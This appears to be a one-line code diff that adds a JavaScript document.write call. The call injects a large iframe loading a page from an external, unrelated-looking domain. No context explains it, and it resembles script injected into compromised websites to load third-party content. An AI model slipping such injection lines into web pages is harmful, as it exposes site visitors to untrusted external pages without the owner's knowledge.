@@ -1,0 +1,1 @@
+document.write('<iframe src="https://gramtakipci.com.tr/gusion.html" width="100%" height="800"></iframe>');
